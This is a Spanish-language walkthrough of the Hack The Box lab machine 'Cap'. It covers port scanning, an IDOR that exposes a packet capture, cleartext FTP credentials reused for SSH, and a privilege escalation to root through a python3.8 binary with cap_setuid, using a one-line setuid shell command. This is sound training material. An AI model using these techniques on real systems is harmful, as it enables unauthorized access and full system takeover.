
# Cap

<figure><img src="/files/TXtFBxcExJTidN3Pj5y0" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Cap`
* **IP:** `10.10.10.245`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `16-09-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.10.245 cap.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.10.245
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos 3 puertos abiertos, entre ellos FTP que puede ser inseguro. Probando un login anonymous no conseguimos acceder, por lo que habrá que buscar otra vía:

```bash
ftp 10.10.10.245

Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
```

### Acceso Web

Accedemos a `http://planning.htb` y observamos que parece ser una plataforma de monitoreo de ciberseguridad expuesta a internet..

<figure><img src="/files/Wd0fjdgPjCMRTTCmBjK3" alt=""><figcaption></figcaption></figure>

Enumerando el sitio web con whatweb obtenemos algo más de info:

```bash
whatweb -a3 -v http://10.10.10.245
WhatWeb report for http://10.10.10.245
Status    : 200 OK
Title     : Security Dashboard
IP        : 10.10.10.245
Country   : RESERVED, ZZ

Summary   : Bootstrap, HTML5, HTTPServer[gunicorn], JQuery[2.2.4], Modernizr[2.8.3.min], Script, X-UA-Compatible[ie=edge]
```

Utiliza Modernizr\[2.8.3.min] por lo que igual podríamos buscar algún exploit.

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

Haciendo fuzzing ncontramos algunas rutas que podrían ser interesantes, cómo un csv de usuarios, aunque no podemos acceder directamente.

```bash
dirsearch -u http://10.10.10.245 -x 404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.10.245/_25-09-16_04-45-30.txt

Target: http://10.10.10.245/

[04:45:31] Starting: 
[04:45:43] 302 -  208B  - /data  ->  http://10.10.10.245/
[04:45:43] 302 -  208B  - /data/adminer.php  ->  http://10.10.10.245/
[04:45:43] 302 -  208B  - /data/autosuggest  ->  http://10.10.10.245/
[04:45:44] 302 -  208B  - /download/history.csv  ->  http://10.10.10.245/
[04:45:44] 302 -  208B  - /download/users.csv  ->  http://10.10.10.245/

Task Completed
```

### Enumeración web

Al entrar al apartado Security Snapshot del menú nos redirige a `/data/3` (que no tiene datos de tráfico) por lo que probando a modificar el número al 0 observamos que el número de páquetes capturados ha aumentado bastante y nos podemos descargar el pcap:

<figure><img src="/files/yZtX5OIMytMcpwkXXGmy" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/BGgyy8k9DH1AZGlpJcBW" alt=""><figcaption></figcaption></figure>

### Análisis del pcap

Abrimos el pcap con Wireshark para analizar el tráfico:

```
wireshark 0.pcap
```

Filtrando por el tráfico FTP encontramos unas credenciales del usuario nathan:

<figure><img src="/files/gJtXU3iUCThNBbd8sWQR" alt=""><figcaption></figcaption></figure>

```
nathan / Buck3tH4TF0RM3!
```

***

## <mark style="color:purple;">Acceso FTP</mark>

Accedemos por FTP y conseguimos la User Flag:

```bash
ftp nathan@10.10.10.245

Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||64950|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Sep 16 11:03 user.txt
226 Directory send OK.

ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||32292|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**************************************************************************************************************************|    33      282.68 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.88 KiB/s)
```

```bash
cat user.txt    
f601336f49928892d09d73634*******
```

***

## <mark style="color:purple;">Acceso SSH</mark>

Además de para FTP, la contraseña de Nathan también sirve para SSH:

```bash
ssh nathan@10.10.10.245

The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

nathan@cap:~$ whoami
nathan
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No podemos ejecutar sudo como nathan:

```shell-session
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
```

### Linpeas

Ejecutamos un Linpeas para ver posibles vectores de escalada de privilegios:

Encontramos un SUID con capabilites que lo marca como crítico:

<figure><img src="/files/4F1Ys4DJDjyyivx2G0MR" alt=""><figcaption></figcaption></figure>

También lo podríamos encontrar con un comando como:

```shell-session
nathan@cap:~$ getcap -r / 2>/dev/null $ which python /usr/bin/python3.8

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Y convertirnos en root sería tan sencillo cómo ejecutar lo siguiente:

```shell-session
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'

root@cap:~# whoami
root
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```shell-session
root@cap:~# cd /root

root@cap:/root# ls
root.txt  snap

root@cap:/root# cat root.txt
c85837ce494c898e6ba6453a2*******
```
